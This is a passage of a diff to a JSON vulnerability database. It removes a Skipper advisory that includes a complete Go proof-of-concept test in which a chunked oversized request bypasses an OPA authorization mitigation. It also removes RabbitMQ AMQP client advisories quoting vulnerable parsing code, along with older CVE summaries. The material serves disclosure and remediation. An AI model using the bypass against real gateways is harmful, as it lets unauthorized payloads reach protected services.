oversized body sent **chunked** (no Content-Length) → `truncated_body=false` → **200**, and the upstream receives the **full** 66-byte payload past the 32-byte inspection cap.\n\nCommand and observed benign output:\n\n```\n$ go test ./filters/openpolicyagent/ -run TestTruncatedBodyChunkedBypass -count=1 -v\n\n    poc_truncated_body_chunked_test.go:148: [content-length ] status=403 upstream_body_bytes=-1\n    poc_truncated_body_chunked_test.go:154: [chunked        ] status=200 upstream_body_bytes=66\nPASS: TestTruncatedBodyChunkedBypass (0.11s)\nPASS\n```\n\n- content-length variant → **403**, upstream received nothing (`-1`) — mitigation works.\n- chunked variant (byte-identical body) → **200**, upstream received the **full 66-byte** payload past the 32-byte cap — **authorization bypass**.\n\n(Full PoC source is appended below by the submission tool via `--poc-file`.)\n\n## Adversarial re-read (refutation attempts)\n\n- *\"Truncated JSON just fails to parse → fail closed.\"* True for `application/json` when truncation lands mid-token, but the bypass does not rely on JSON: `application/x-www-form-urlencoded` parses leniently after truncation, and unparsed/absent content-types return `(nil, false, nil)` with no error. The load-bearing signal is `truncated_body`, not `parsed_body`, and it is `false` in all these cases.\n- *\"Maybe Skipper adds a content-length for chunked before OPA sees it.\"* No — `AdaptToExtAuthRequest` copies `req.Header` verbatim (lowercased); a chunked request has no `content-length` header, and net/http does not synthesise one. Confirmed by reading `skipperadapter.go`.\n- *\"Maybe the mitigation is `deny if truncated_body == true` (allow-by-default), which is unaffected.\"* Both shapes in the advisory rely on `truncated_body` correctly reflecting truncation; the deny-if shape simply *fails to deny* under the same chunked condition. The allow-if shape (shown) fails open directly.\n- *\"Is this already covered by CVE-2026-50197?\"* No. 50197 was the *empty-body* chunked bypass (OPA saw no body); its fix makes OPA see the truncated prefix. GHSA-8qqm was the declared-Content-Length oversized variant; its fix populates `parsed_body` and recommends `truncated_body`. Neither addresses `truncated_body` being unset for chunked/HTTP-2 oversized bodies. The 8qqm positive-control test only used small chunked bodies.\n\nResult: survives refutation; concrete, reproducible bypass of the published mitigation. Differentiation check passes (incomplete-fix of a published advisory, not a generic surface bug).\n\n## Remediation\n\nDo not rely on the client-supplied `content-length` header to detect truncation. Skipper should signal truncation authoritatively to OPA rather than delegating to the plugin's Content-Length heuristic. Concretely, in `ExtractHttpBodyOptionally`, detect that the underlying body still has bytes after `maxBodyBytes` were buffered (e.g. attempt one more read / peek) and propagate a definitive truncation indicator — for example by setting a synthetic `content-length` (or a dedicated context extension / metadata field) that reflects the real truncation state, so `input.truncated_body` is `true` whenever the body was actually cut, regardless of transfer encoding. Alternatively, reject (413) requests whose body exceeds `maxBodyBytes` when body-based authorization is enabled, instead of silently truncating. Upstream, `opa-envoy-plugin` should treat \"body present but not fully inspectable and no content-length\" as truncated rather than defaulting to `false`.\n\n## Confidence\n\nHigh. Root cause verified in both Skipper and the pinned `opa-envoy-plugin@v1.14.1-envoy` source; executable PoC demonstrates the status/upstream-body divergence against the maintainer's own recommended mitigation.\n\n## Proof-of-Concept source (`poc_truncated_body_chunked_test.go`)\n\n```go\npackage openpolicyagent_test\n\nimport (\n\t\"fmt\"\n\t\"io\"\n\t\"net/http\"\n\t\"net/http/httptest\"\n\t\"strings\"\n\t\"sync/atomic\"\n\t\"testing\"\n\t\"time\"\n\n\topasdktest \"github.com/open-policy-agent/opa/v1/sdk/test\"\n\t\"github.com/stretchr/testify/assert\"\n\t\"github.com/zalando/skipper/eskip\"\n\t\"github.com/zalando/skipper/filters\"\n\t\"github.com/zalando/skipper/filters/builtin\"\n\t\"github.com/zalando/skipper/filters/openpolicyagent\"\n\t\"github.com/zalando/skipper/filters/openpolicyagent/opaauthorizerequest\"\n\t\"github.com/zalando/skipper/proxy\"\n\t\"github.com/zalando/skipper/routing\"\n\t\"github.com/zalando/skipper/routing/testdataclient\"\n)\n\n// TestTruncatedBodyChunkedBypass demonstrates that the GHSA-8qqm-fp2q-v734\n// mitigation (\"check input.truncated_body in your policy\") fails OPEN when the\n// oversized request is sent with Transfer-Encoding: chunked (no Content-Length).\n//\n// The mitigation Rego (verbatim from the advisory):\n//\n//\tdefault allow := false\n//\tallow if { input.truncated_body == false }\n//\n// truncated_body is derived by the OPA envoy plugin ONLY when a content-length\n// header is present (opa-envoy-plugin envoyauth/request.go getParsedBody ->\n// checkIfHTTPBodyTruncated). A chunked / HTTP-2 request carries no\n// content-length, so truncated_body stays false even though Skipper truncated\n// the body to max-request-body-size. The mitigated policy therefore ALLOWS an\n// oversized body and the full payload reaches upstream.\nfunc TestTruncatedBodyChunkedBypass(t *testing.T) {\n\tconst maxBody = 32\n\t// oversized url-encoded payload: \"a=\" + 64 * \"A\" = 66 bytes > 32.\n\tpayload := \"a=\" + strings.Repeat(\"A\", 64)\n\n\t// upstream records how many body bytes it actually received.\n\tvar upstreamBytes atomic.Int64\n\tbackend := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n\t\tn, _ := io.Copy(io.Discard, r.Body)\n\t\tupstreamBytes.Store(n)\n\t\tw.WriteHeader(200)\n\t\tw.Write([]byte(\"OK\"))\n\t}))\n\tdefer backend.Close()\n\n\tbundleName := \"test-bundle\"\n\topaControlPlane := opasdktest.MustNewServer(\n\t\topasdktest.MockBundle(\"/bundles/\"+bundleName, map[string]string{\n\t\t\t// The exact mitigation the advisory recommends.\n\t\t\t\"main.rego\": `\npackage envoy.authz\n\nimport rego.v1\n\ndefault allow := false\n\nallow if {\n    input.truncated_body == false\n}\n`,\n\t\t}),\n\t)\n\tdefer opaControlPlane.Stop()\n\n\tconfig := fmt.Appendf(nil, `{\n\t\t\"services\": {\"test\": {\"url\": %q}},\n\t\t\"bundles\": {\"test\": {\"resource\": \"/bundles/{{ .bundlename }}\"}},\n\t\t\"labels\": {\"environment\": \"test\"},\n\t\t\"plugins\": {\"envoy_ext_authz_grpc\": {\"path\": \"envoy/authz/allow\", \"dry-run\": false}}\n\t}`, opaControlPlane.URL())\n\n\topaRegistry, err := openpolicyagent.NewOpenPolicyAgentRegistry(\n\t\topenpolicyagent.WithPreloadingEnabled(true),\n\t\topenpolicyagent.WithEnableDataPreProcessingOptimization(true),\n\t\topenpolicyagent.WithInstanceStartupTimeout(5*time.Second),\n\t\topenpolicyagent.WithMaxRequestBodyBytes(maxBody),\n\t\topenpolicyagent.WithOpenPolicyAgentInstanceConfig(\n\t\t\topenpolicyagent.WithConfigTemplate(config)),\n\t)\n\tif err != nil {\n\t\tt.Fatalf(\"opaRegistry: %v\", err)\n\t}\n\tdefer opaRegistry.Close()\n\n\tfr := make(filters.Registry)\n\tfr.Register(opaauthorizerequest.NewOpaAuthorizeRequestWithBodySpec(opaRegistry))\n\tfr.Register(builtin.NewSetPath())\n\n\tdocFmt := `r1: * -> opaAuthorizeRequestWithBody(\"%s\") -> \"%s\";`\n\tr := eskip.MustParse(fmt.Sprintf(docFmt, bundleName, backend.URL))\n\tdc := testdataclient.New(r)\n\tdefer dc.Close()\n\n\trt := routing.New(routing.Options{\n\t\tFilterRegistry:  fr,\n\t\tDataClients:     []routing.DataClient{dc},\n\t\tPreProcessors:   []routing.PreProcessor{opaRegistry.NewPreProcessor()},\n\t\tPostProcessors:  []routing.PostProcessor{opaRegistry},\n\t\tPollTimeout:     time.Second,\n\t\tSignalFirstLoad: true,\n\t})\n\tdefer rt.Close()\n\t<-rt.FirstLoad()\n\n\tpr := proxy.WithParams(proxy.Params{Routing: rt})\n\tdefer pr.Close()\n\tts := httptest.NewServer(pr)\n\tdefer ts.Close()\n\n\tinst, err := opaRegistry.GetOrStartInstance(bundleName)\n\tassert.NoError(t, err)\n\tassert.NotNil(t, inst)\n\n\tdoReq := func(chunked bool) (int, int64) {\n\t\tupstreamBytes.Store(-1)\n\t\treq, err := http.NewRequest(\"POST\", ts.URL, strings.NewReader(payload))\n\t\tif err != nil {\n\t\t\tt.Fatalf(\"new request: %v\", err)\n\t\t}\n\t\treq.Header.Set(\"Content-Type\", \"application/x-www-form-urlencoded\")\n\t\tif chunked {\n\t\t\t// Force chunked framing: no Content-Length reaches the server,\n\t\t\t// so the server sees req.ContentLength == -1.\n\t\t\treq.ContentLength = -1\n\t\t\treq.TransferEncoding = []string{\"chunked\"}\n\t\t}\n\t\trsp, err := ts.Client().Do(req)\n\t\tif err != nil {\n\t\t\tt.Fatalf(\"do: %v\", err)\n\t\t}\n\t\tio.Copy(io.Discard, rsp.Body)\n\t\trsp.Body.Close()\n\t\treturn rsp.StatusCode, upstreamBytes.Load()\n\t}\n\n\t// POSITIVE CONTROL: oversized body WITH Content-Length.\n\t// truncated_body == true  -> policy denies. Mitigation works as designed.\n\tclStatus, clUpstream := doReq(false)\n\tt.Logf(\"[content-length ] status=%d upstream_body_bytes=%d\", clStatus, clUpstream)\n\tassert.Equal(t, 403, clStatus, \"oversized body with Content-Length must be DENIED (mitigation working)\")\n\n\t// BYPASS: identical oversized body sent CHUNKED (no Content-Length).\n\t// truncated_body == false -> policy ALLOWS -> full payload reaches upstream.\n\tchStatus, chUpstream := doReq(true)\n\tt.Logf(\"[chunked        ] status=%d upstream_body_bytes=%d\", chStatus, chUpstream)\n\n\tassert.Equal(t, 200, chStatus, \"BYPASS: oversized chunked body was ALLOWED by the truncated_body mitigation\")\n\tassert.Equal(t, int64(len(payload)), chUpstream,\n\t\t\"BYPASS: upstream received the FULL oversized payload past OPA authorization\")\n}\n\n```",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2026-09-17",
-      "modified": "2026-09-17",
-      "cwe": {
-        "cwe_id": "CWE-863",
-        "name": "Incorrect Authorization"
-      },
-      "references": [
-        "https://github.com/zalando/skipper/security/advisories/GHSA-5gpm-rgj3-9q76",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-86043",
-        "https://github.com/zalando/skipper/commit/2cfceabaa6ff0af65b312dcb9bcbe84691b9d507",
-        "https://github.com/zalando/skipper/releases/tag/v0.27.35",
-        "https://github.com/zalando/skipper/releases/tag/v0.27.37"
-      ],
-      "vulnerableProducts": [
-        "github.com/zalando/skipper go"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-77412",
-      "summary": "**Summary**\nA vulnerability in the readField function allows a malicious or compromised AMQP server to trigger an unhandled runtime panic in the client application, leading to an immediate crash of the entire process.\n\n**Details**\nWhen parsing incoming AMQP frames, the `readField` function processes byte-array fields (type tag `'x'`) by reading a 32-bit big-endian integer to determine the length of the data payload.\n\n```go\n// read.go:253-263\ncase 'x':\n    var len int32\n    if err = binary.Read(r, binary.BigEndian, &len); err != nil {\n        return nil, err\n    }\n    value := make([]byte, len)  // PANICS if len < 0\n```\n\nIf a server transmits a length value of `0xFFFFFFFF`, it is interpreted by the client as a signed 32-bit integer with a value of `-1`. Passing a negative integer to Go's built-in make() function for slice allocation triggers an unrecoverable runtime panic (panic: len out of range).\n\nBecause the reader goroutine handles network I/O without an explicit recover() wrapper, this panic propagates up to the runtime root, abruptly terminating the host application.\n\n**Attack Vector / Exploitation Scenario**\nAn attacker capable of spoofing, compromising, or controlling an AMQP broker can exploit this flaw during two primary phases:\n\n1. Connection Establishment: Sending a malicious connection.start handshake frame containing server-properties with an 'x' type field assigned a negative length.\n2. Message Delivery: Delivering a message payload where the header table contains a malformed field matching the criteria above.\n\n**Impact**\nAvailability: High. A single malformed frame can reliably crash the client process, resulting in a persistent Denial of Service (DoS) if the client automatically reconnects and receives the same payload.",
-      "cvssScore": 8.9,
-      "severity": "High",
-      "published": "2026-09-17",
-      "modified": "2026-09-17",
-      "cwe": {
-        "cwe_id": "CWE-681",
-        "name": "Incorrect Conversion between Numeric Types"
-      },
-      "references": [
-        "https://github.com/rabbitmq/amqp091-go/security/advisories/GHSA-4v58-74mf-rjx3",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-77412",
-        "https://github.com/rabbitmq/amqp091-go/pull/344",
-        "https://github.com/rabbitmq/amqp091-go/commit/669b42bf7b1db76bc6d4973e3634247f680accbf",
-        "https://github.com/rabbitmq/amqp091-go/releases/tag/v1.13.0"
-      ],
-      "vulnerableProducts": [
-        "github.com/rabbitmq/amqp091-go go"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-77411",
-      "summary": "**Summary**\n\nA critical stream desynchronization vulnerability has been identified in the AMQP wire-protocol parser. When parsing a long string (`readLongstr`) within a table field, providing a length that exceeds the maximum signed 32-bit integer (`2^31 - 1`, or roughly `2.1` GiB) triggers an improper error-handling condition. The parser abruptly aborts the read and returns a success status (`\"\",nil`) without consuming the specified bytes from the underlying network buffer. This causes all subsequent read operations to become misaligned. The parser interprets arbitrary offsets within the remaining payload bytes as valid AMQP frame headers, leading to potential Remote Code Execution (RCE), data injection, or complete connection hijacking.\n\n**Vulnerability Details**\n\nThe vulnerability exists within the bounds-checking logic of the readLongstr function:\n```go\n// read.go:113-114 — silent no-op return, bytes left in stream\nif length > (^uint32(0) >> 1) {\n    return  // returns \"\", nil, does NOT consume `length` bytes\n}\n```\nWhen `length` evaluates to a value greater than `0x7FFFFFFF`:\n\n1. The function executes a silent `return` statement.\n2. Because Go utilizes named or zero-value initialization for unassigned return registers, this yields `\"\", nil` (indicating a successful read of an empty string).\n3. The Critical Failure: The reader's cursor is not advanced by `length` bytes. The malformed payload remains sitting in the TCP/buffer stream.\n\n**Impact**\n\nAs `readTable` continues iterating over the stream under the assumption that the string was successfully parsed, the byte alignment is entirely broken.\n\n- Parser Desynchronization: Future AMQP frame headers are read from arbitrary offsets inside the attacker-controlled message payload.\n- Payload Reinterpretation: A malicious actor can carefully craft the trailing bytes of the initial payload to perfectly mimic valid AMQP frames (e.g., `connection.close`, `channel.open`, or message publishing frames), forcing the client/server to execute unintended actions.",
-      "cvssScore": 9.5,
-      "severity": "Critical",
-      "published": "2026-09-17",
-      "modified": "2026-09-17",
-      "cwe": {
-        "cwe_id": "CWE-754",
-        "name": "Improper Check for Unusual or Exceptional Conditions"
-      },
-      "references": [
-        "https://github.com/rabbitmq/amqp091-go/security/advisories/GHSA-c5pq-fr2g-9jpf",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-77411",
-        "https://github.com/rabbitmq/amqp091-go/pull/347",
-        "https://github.com/rabbitmq/amqp091-go/commit/143c1ace5fa7344cee135e5c7d22970f0de68282",
-        "https://github.com/rabbitmq/amqp091-go/releases/tag/v1.13.0"
-      ],
-      "vulnerableProducts": [
-        "github.com/rabbitmq/amqp091-go go"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-77410",
-      "summary": "**Summary**\nA flaw in the `recvContent` function allows a malicious AMQP server to trigger an Out-of-Memory (OOM) error, forcing the host operating system or container runtime to immediately terminate the client process.\n\n**Vulnerability Details**\nWhen receiving message content payloads, the client processes the expected size from the content header framework. The `recvContent` function attempts to optimize performance by pre-allocating memory for the message body based on the `ch.header.Size` field, which is a 64-bit unsigned integer (`uint64`).\n\n```go\n// channel.go:495-496\nif cap(ch.body) == 0 {\n    ch.body = make([]byte, 0, ch.header.Size)  // unbounded\n}\n```\n\nThe underlying library fails to validate or cap this requested size against any upper boundary—such as the maximum frame size negotiated during connection establishment (`FrameMax`). If a server specifies an extreme body size (e.g., `2^62` bytes), the Go runtime attempts to allocate an exabyte-scale slice capacity. This immediately exhausts available system memory, causing the operating system's OOM killer to terminate the application.\n\n**Attack Vector / Exploitation Scenario**\n\n- Message Delivery Phase: A malicious or compromised AMQP broker sends a standard `basic.deliver` frame containing a content header with an intentionally inflated `body-size` variable.\n- Authentication Requirement: No special privileges or authentication bypasses are required; the crash occurs seamlessly during normal message consumption.\n\n**Impact**\n\n- Availability: High. Exploded memory consumption results in an instant process termination, destroying application state and availability for all threads sharing the environment.",
-      "cvssScore": 8.9,
-      "severity": "High",
-      "published": "2026-09-17",
-      "modified": "2026-09-17",
-      "cwe": {
-        "cwe_id": "CWE-789",
-        "name": "Memory Allocation with Excessive Size Value"
-      },
-      "references": [
-        "https://github.com/rabbitmq/amqp091-go/security/advisories/GHSA-r9c8-gcjp-xfwh",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-77410",
-        "https://github.com/rabbitmq/amqp091-go/pull/346",
-        "https://github.com/rabbitmq/amqp091-go/commit/91b65fa0096a99a580cf51a31b24028ff1c60382",
-        "https://github.com/rabbitmq/amqp091-go/releases/tag/v1.13.0"
-      ],
-      "vulnerableProducts": [
-        "github.com/rabbitmq/amqp091-go go"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-77408",
-      "summary": "## Summary\nA data integrity and protocol corruption vulnerability exists in the AMQP client's property serialization logic. When encoding AMQP short string (`shortstr`) fields—such as identifiers, routing strings, and content metadata—the length of the string is explicitly cast to a fixed-size 8-bit unsigned integer (`uint8`). \n\nIf an application provides a property string exceeding 255 bytes, the length counter silently wraps around (e.g., a length of 300 wraps to 44). As a result, the parser writes only a truncated portion of the string into the outgoing connection buffer without returning an error. This leads to silent data corruption, broken RPC routing, and unpredictable broker-side state behavior.\n\n## Vulnerability Details\n\n### Mechanism\nThe vulnerability resides in the wire-level serialization logic for application publishing properties:\n\n```go\n// write.go:246\nlength := uint8(len(b))  // wraps silently when len(b) > 255 (e.g., 300 -> 44)\n```\n\nBecause Go allows silent integer truncation during explicit type casting, lengths larger than $2^8 - 1$ lose their most significant bits. The underlying stream writer reads `length` to determine how many bytes to pull from the buffer. Because no error or boundary check accompanies this truncation, the application believes the full payload was transmitted successfully.\n\n### Affected Properties\nThis truncation behavior affects every standard AMQP field serialized as a `shortstr`:\n* `CorrelationId`\n* `ReplyTo`\n* `MessageId`\n* `Expiration`\n* `UserId`\n* `AppId`\n* `ContentType`\n* `ContentEncoding`\n* `Type`\n\n### Impact\nThe critical consequence is **silent protocol desynchronization at the application layer**. The underlying TCP stream remains framed properly (because the shortened length matches the bytes written), but the business logic is corrupted. Distributed transactions, request-reply correlations, and tracing headers are truncated, causing downstream systems to drop messages or route them to incorrect consumers.\n\n## Attack Vector\nAn attacker who can influence metadata fields processed by an upstream application (such as a user-supplied tracking ID or a long content-type header) can exploit this to break system components:\n\n1. **Targeting RPC Routing:** A user passes a malicious or overly long `CorrelationId` of 300 bytes through an application endpoint.\n2. **Silent Truncation:** The library wraps the length value to 44, transmitting only the first 44 bytes to the rabbitMQ broker.\n3. **Broken Correlation:** When the service processes the request and responds, the replying consumer attempts to route the message using the full 300-byte identifier. Because the broker only recognizes the truncated 44-byte ID, the reply loop breaks silently, leading to hanging processes or data leaks across transaction boundaries.",
-      "cvssScore": 9.1,
-      "severity": "Critical",
-      "published": "2026-09-17",
-      "modified": "2026-09-17",
-      "cwe": {
-        "cwe_id": "CWE-190",
-        "name": "Integer Overflow or Wraparound"
-      },
-      "references": [
-        "https://github.com/rabbitmq/amqp091-go/security/advisories/GHSA-j497-x9hr-x34x",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-77408",
-        "https://github.com/rabbitmq/amqp091-go/pull/354",
-        "https://github.com/rabbitmq/amqp091-go/commit/6959423aa2784a1971e399175dfb2065dea0f3b0",
-        "https://github.com/rabbitmq/amqp091-go/releases/tag/v1.13.0"
-      ],
-      "vulnerableProducts": [
-        "github.com/rabbitmq/amqp091-go go"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-77407",
-      "summary": "## Summary\nAn information disclosure vulnerability exists in the AMQP client implementation's authentication handling configuration. Following a successful connection handshake, the `Connection.Config.SASL` field stores the `Authentication` implementation state used to establish the session. \n\nFor standard `PLAIN` authentication, this state utilizes the `PlainAuth` struct, which defines both `Username` and `Password` as publicly exported, plaintext string fields. Because this sensitive data is retained permanently in-memory within an exported field structure, any peripheral code, internal package, reflective logger, dependency, or automated debugging utility with access to the core `*Connection` object can read and expose the raw credentials.\n\n## Vulnerability Details\n\n### Mechanism\nThe vulnerability stems from the structural design of the configuration storage used during and after the AMQP handshake:\n\n```go\n// auth.go:21-23\ntype PlainAuth struct {\n    Username string\n    Password string  // exported plaintext\n}\n```\n\nWhen an application initializes a connection, the `PlainAuth` object is deeply nested inside the configuration structure (`Connection.Config`). Even after the handshake concludes and authentication is complete, this structure persists natively in-memory for the duration of the network connection's lifecycle. \n\nBecause `Password` is an exported string field, standard automated inspection mechanisms can read its value without restriction.\n\n### Affected Code Paths & Integrations\nAny sub-component or library that traverses or reads the `*Connection` object will inadvertently read the plaintext password, including:\n* **Reflective Loggers:** Structured logging frameworks that serialize nested configuration structs into JSON/Log formats.\n* **APM & Performance Agents:** Automated telemetry or Application Performance Monitoring tools that capture state snapshots.\n* **Debugging & Panic Handlers:** Mid-tier software or dump libraries designed to capture goroutine state or print deep struct hierarchies upon program errors or signals.\n\n### Impact\nThe credential remains vulnerable to leak paths into logging pipelines, log aggregators, security information and event management (SIEM) systems, or standard output. Once transmitted to external log infrastructure, these credentials become accessible to unprivileged operators or any actor with access to log archives.\n\n## Attack Vector\nAn attacker does not necessarily need direct remote code execution to exploit this flaw; instead, the vulnerability acts as a credential harvesting vector inside multi-tenant environments or via secondary log exposure:\n\n1. **Configuration Dump:** An operator configures a standard reflective logger or third-party APM package to capture system state parameters, including the active AMQP `*Connection` object.\n2. **Reflective Access:** The inspection engine uses Go's `reflect` package to walk the structural hierarchy, pulling the string value from `Connection.Config.SASL.(*PlainAuth).Password`.\n3. **Exfiltration:** The plaintext password is written to standard system logs, which are then scraped into shared logging aggregators, exposing production infrastructure credentials to a wider audience.",
-      "cvssScore": 7,
-      "severity": "High",
-      "published": "2026-09-17",
-      "modified": "2026-09-17",
-      "cwe": {
-        "cwe_id": "CWE-316",
-        "name": "Cleartext Storage of Sensitive Information in Memory"
-      },
-      "references": [
-        "https://github.com/rabbitmq/amqp091-go/security/advisories/GHSA-27gv-rfvv-22mv",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-77407",
-        "https://github.com/rabbitmq/amqp091-go/pull/350",
-        "https://github.com/rabbitmq/amqp091-go/commit/fa013b8447eb60988db3c9281ff6b981e4d2fb4f",
-        "https://github.com/rabbitmq/amqp091-go/releases/tag/v1.13.0"
-      ],
-      "vulnerableProducts": [
-        "github.com/rabbitmq/amqp091-go go"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2003-1082",
-      "summary": "Buffer overflow in utmp_update for Solaris 2.6 through 9 allows local users to gain root privileges, as identified by Sun BugID 4705891, a different vulnerability than CVE-2003-1068.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "2003-12-31",
+      "published": "2001-02-12",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://secunia.com/advisories/7892",
-        "http://sunsolve.sun.com/search/document.do?assetkey=1-26-50008-1",
-        "http://www.ciac.org/ciac/bulletins/n-105.shtml",
-        "http://www.kb.cert.org/vuls/id/596748",
-        "http://www.securityfocus.com/bid/6639"
+        "http://www.securityfocus.com/archive/1/153212",
+        "http://www.securityfocus.com/bid/2156",
+        "http://www.securityfocus.com/archive/1/153212",
+        "http://www.securityfocus.com/bid/2156"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2003-1083",
-      "summary": "Stack-based buffer overflow in Monit 1.4 to 4.1 allows remote attackers to execute arbitrary code via a long HTTP request.",
+      "id": "CVE-2001-0076",
+      "summary": "register.cgi in Ikonboard 2.1.7b and earlier allows remote attackers to execute arbitrary commands via the SEND_MAIL parameter, which overwrites an internal program variable that references a program to be executed.",
       "cvssScore": 10,
       "severity": "Critical",
-      "published": "2003-12-31",
+      "published": "2001-02-12",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://secunia.com/advisories/10280",
-        "http://security.gentoo.org/glsa/glsa-200403-14.xml",
-        "http://www.kb.cert.org/vuls/id/623854",
-        "http://www.securityfocus.com/archive/1/345417",
-        "http://www.securityfocus.com/bid/9099"
+        "http://archives.neohapsis.com/archives/bugtraq/2000-12/0483.html",
+        "http://www.securityfocus.com/bid/2157",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5819",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-12/0483.html",
+        "http://www.securityfocus.com/bid/2157"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2003-1085",
-      "summary": "The HTTP server in the Thomson TWC305, TWC315, and TCW690 cable modem ST42.03.0a allows remote attackers to cause a denial of service (unstable service) via a long GET request, possibly caused by a buffer overflow.",
+      "id": "CVE-2001-0077",
+      "summary": "The clustmon service in Sun Cluster 2.x does not require authentication, which allows remote attackers to obtain sensitive information such as system logs and cluster configurations.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2003-12-31",
+      "published": "2001-02-12",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://lists.grok.org.uk/pipermail/full-disclosure/2003-November/014062.html",
-        "http://lists.grok.org.uk/pipermail/full-disclosure/2003-November/014068.html",
-        "http://marc.info/?l=bugtraq&m=110888093214678&w=2",
-        "http://marc.info/?l=full-disclosure&m=110880725322192&w=2",
-        "http://secunia.com/advisories/10286"
+        "http://archives.neohapsis.com/archives/bugtraq/2000-12/0180.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6123",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-12/0180.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6123"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2003-1087",
-      "summary": "Unknown vulnerability in diagmond and possibly other applications in HP9000 Series 700/800 running HP-UX B.11.00, B.11.04, B.11.11, and B.11.22 allows remote attackers to cause a denial of service (program failure) via certain network traffic.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2003-12-31",
+      "id": "CVE-2001-0078",
+      "summary": "in.mond in Sun Cluster 2.x allows local users to read arbitrary files via a symlink attack on the status file of a host running HA-NFS.",
+      "cvssScore": 2.1,
+      "severity": "Low",
+      "published": "2001-02-12",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://marc.info/?l=bugtraq&m=109292319608851&w=2",
-        "http://secunia.com/advisories/8971",
-        "http://www.securityfocus.com/bid/7827",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/12199",
-        "http://marc.info/?l=bugtraq&m=109292319608851&w=2"
+        "http://archives.neohapsis.com/archives/bugtraq/2000-12/0180.html",
+        "http://www.osvdb.org/6437",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6125",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-12/0180.html",
+        "http://www.osvdb.org/6437"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2003-1089",
-      "summary": "index.php for Zorum 3.4 allows remote attackers to determine the full path of the web root via invalid parameter names, which reveals the path in a PHP error message.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2003-12-31",
+      "id": "CVE-2001-0079",
+      "summary": "Support Tools Manager (STM) A.22.00 for HP-UX allows local users to overwrite arbitrary files via a symlink attack on the tool_stat.txt log file.",
+      "cvssScore": 2.1,
+      "severity": "Low",
+      "published": "2001-02-12",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://marc.info/?l=bugtraq&m=106063199925536&w=2",
-        "http://securitytracker.com/id?1013365",
-        "http://www.securityfocus.com/bid/8396",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/12868",
-        "http://marc.info/?l=bugtraq&m=106063199925536&w=2"
+        "http://archives.neohapsis.com/archives/bugtraq/2000-12/0174.html",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-12/0174.html"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-1865",
-      "summary": "Buffer overflow in the Embedded HTTP server, as used in (1) D-Link DI-804 4.68, Dl-704 V2.56b6, and Dl-704 V2.56b5 and (2) Linksys Etherfast BEFW11S4 Wireless AP + Cable/DSL Router 1.37.2 through 1.42.7 and Linksys WAP11 1.3 and 1.4, allows remote attackers to cause a denial of service (crash) via a long header, as demonstrated using the Host header.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2002-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/vulnwatch/2002-q4/0052.html",
-        "http://www.iss.net/security_center/static/10537.php",
-        "http://www.securityfocus.com/bid/6090",
-        "http://archives.neohapsis.com/archives/vulnwatch/2002-q4/0052.html",
-        "http://www.iss.net/security_center/static/10537.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2003-1340",
-      "summary": "Multiple SQL injection vulnerabilities in Francisco Burzi PHP-Nuke 5.6 and 6.5 allow remote authenticated users to execute arbitrary SQL commands via (1) a uid (user) cookie to modules.php; and allow remote attackers to execute arbitrary SQL commands via an aid (admin) cookie to the Web_Links module in a (2) viewlink, (3) MostPopular, or (4) NewLinksDate action, different vectors than CVE-2003-0279.",
-      "cvssScore": 6.5,
-      "severity": "Medium",
-      "published": "2003-12-31",
-      "modified": null,
-      "cwe": "CWE-89",
-      "references": [
-        "http://securityreason.com/securityalert/3185",
-        "http://www.securityfocus.com/archive/1/323425",
-        "http://www.securityfocus.com/archive/1/480866/100/0/threaded",
-        "http://securityreason.com/securityalert/3185",
-        "http://www.securityfocus.com/archive/1/323425"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2003-1341",
-      "summary": "The default installation of Trend Micro OfficeScan 3.0 through 3.54 and 5.x allows remote attackers to bypass authentication from cgiChkMasterPasswd.exe and gain access to the web management console via a direct request to cgiMasterPwd.exe.",
+      "id": "CVE-2004-2044",
